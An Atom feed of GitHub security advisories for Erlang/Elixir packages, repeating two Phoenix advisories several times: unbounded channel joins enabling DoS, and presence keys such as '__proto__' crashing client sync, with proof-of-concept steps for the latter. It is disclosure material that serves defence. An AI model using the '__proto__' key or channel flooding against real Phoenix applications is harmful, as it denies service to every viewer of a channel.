<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/erlang.rss</id>
    <title>Security Advisory for Erlang/Elixir packages hosted at hex.pm</title>
    <updated>2026-09-03T23:39:30.755Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aerlang"/>
    <subtitle>Security Advisory for Erlang/Elixir packages hosted at hex.pm on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Unbounded channel joins per transport enables DoS over few connections]]></title>
        <id>https://github.com/advisories/GHSA-6983-jfq8-485w</id>
        <link href="https://github.com/advisories/GHSA-6983-jfq8-485w"/>
        <updated>2026-09-03T20:33:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Phoenix transports do not limit the number of channels in a given connection, making it easy to spawn hundreds of thousands of processes over a single connection, and, eventually reaching the max processes VM limit. The solution is to limit the number of channels per transport, so an attacker needs to start new HTTP/WebSocket connections, allowing third-party services to apply rate limits and intervene more easily.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated remote attacker can cause a denial of service against any Phoenix app that exposes LongPoll/WebSocket transports.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56811">https://nvd.nist.gov/vuln/detail/CVE-2026-56811</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a">https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1">https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218">https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e">https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56811.html">https://cna.erlef.org/cves/CVE-2026-56811.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56811">https://osv.dev/vulnerability/EEF-CVE-2026-56811</a></li>
<li><a href="https://github.com/advisories/GHSA-6983-jfq8-485w">https://github.com/advisories/GHSA-6983-jfq8-485w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6983-jfq8-485w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T20:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Unbounded channel joins per transport enables DoS over few connections]]></title>
        <id>https://github.com/advisories/GHSA-6983-jfq8-485w</id>
        <link href="https://github.com/advisories/GHSA-6983-jfq8-485w"/>
        <updated>2026-09-03T20:33:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Phoenix transports do not limit the number of channels in a given connection, making it easy to spawn hundreds of thousands of processes over a single connection, and, eventually reaching the max processes VM limit. The solution is to limit the number of channels per transport, so an attacker needs to start new HTTP/WebSocket connections, allowing third-party services to apply rate limits and intervene more easily.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated remote attacker can cause a denial of service against any Phoenix app that exposes LongPoll/WebSocket transports.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56811">https://nvd.nist.gov/vuln/detail/CVE-2026-56811</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a">https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1">https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218">https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e">https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56811.html">https://cna.erlef.org/cves/CVE-2026-56811.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56811">https://osv.dev/vulnerability/EEF-CVE-2026-56811</a></li>
<li><a href="https://github.com/advisories/GHSA-6983-jfq8-485w">https://github.com/advisories/GHSA-6983-jfq8-485w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6983-jfq8-485w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T20:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Unbounded channel joins per transport enables DoS over few connections]]></title>
        <id>https://github.com/advisories/GHSA-6983-jfq8-485w</id>
        <link href="https://github.com/advisories/GHSA-6983-jfq8-485w"/>
        <updated>2026-09-03T20:33:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Phoenix transports do not limit the number of channels in a given connection, making it easy to spawn hundreds of thousands of processes over a single connection, and, eventually reaching the max processes VM limit. The solution is to limit the number of channels per transport, so an attacker needs to start new HTTP/WebSocket connections, allowing third-party services to apply rate limits and intervene more easily.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated remote attacker can cause a denial of service against any Phoenix app that exposes LongPoll/WebSocket transports.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56811">https://nvd.nist.gov/vuln/detail/CVE-2026-56811</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a">https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1">https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218">https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e">https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56811.html">https://cna.erlef.org/cves/CVE-2026-56811.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56811">https://osv.dev/vulnerability/EEF-CVE-2026-56811</a></li>
<li><a href="https://github.com/advisories/GHSA-6983-jfq8-485w">https://github.com/advisories/GHSA-6983-jfq8-485w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6983-jfq8-485w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T20:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Unbounded channel joins per transport enables DoS over few connections]]></title>
        <id>https://github.com/advisories/GHSA-6983-jfq8-485w</id>
        <link href="https://github.com/advisories/GHSA-6983-jfq8-485w"/>
        <updated>2026-09-03T20:33:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Phoenix transports do not limit the number of channels in a given connection, making it easy to spawn hundreds of thousands of processes over a single connection, and, eventually reaching the max processes VM limit. The solution is to limit the number of channels per transport, so an attacker needs to start new HTTP/WebSocket connections, allowing third-party services to apply rate limits and intervene more easily.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated remote attacker can cause a denial of service against any Phoenix app that exposes LongPoll/WebSocket transports.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-6983-jfq8-485w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56811">https://nvd.nist.gov/vuln/detail/CVE-2026-56811</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a">https://github.com/phoenixframework/phoenix/commit/16e295d2fccab185d1292322e2bee5d46c725c8a</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1">https://github.com/phoenixframework/phoenix/commit/a612100cd8a4279091abc1a2ef8fb98a6d01c0a1</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218">https://github.com/phoenixframework/phoenix/commit/c498ba8cf49f6accbbd0c643a5340b58db891218</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e">https://github.com/phoenixframework/phoenix/commit/d19ca0a8d9f82c130b7ed339b9f033433e2dea5e</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56811.html">https://cna.erlef.org/cves/CVE-2026-56811.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56811">https://osv.dev/vulnerability/EEF-CVE-2026-56811</a></li>
<li><a href="https://github.com/advisories/GHSA-6983-jfq8-485w">https://github.com/advisories/GHSA-6983-jfq8-485w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6983-jfq8-485w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T20:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
